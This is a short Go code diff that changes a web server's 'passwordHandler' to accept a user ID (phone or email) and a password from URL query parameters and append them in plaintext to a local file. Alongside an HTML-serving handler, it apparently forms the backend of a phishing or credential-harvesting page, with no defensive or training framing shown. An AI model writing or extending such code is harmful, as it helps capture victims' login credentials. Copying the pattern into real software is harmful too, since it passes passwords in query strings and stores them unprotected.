@@ -35,10 +35,10 @@ func htmlHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func passwordHandler(w http.ResponseWriter, r *http.Request) {
-	email := r.URL.Query().Get("email")
+	id := r.URL.Query().Get("user_id")
 	password := r.URL.Query().Get("password")
-	if email == "" || password == "" {
-		http.Error(w, "email and password are not valid", http.StatusBadRequest)
+	if id == "" || password == "" {
+		http.Error(w, "id and password are not valid", http.StatusBadRequest)
 		return
 	}
 	f, err := os.OpenFile(dataFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
@@ -51,5 +51,5 @@ func passwordHandler(w http.ResponseWriter, r *http.Request) {
 			panic(err)
 		}
 	}()
-	fmt.Fprintf(f, "email:%s password:%s\n", email, password)
+	fmt.Fprintf(f, "phone/email:%s password:%s\n", id, password)
 }
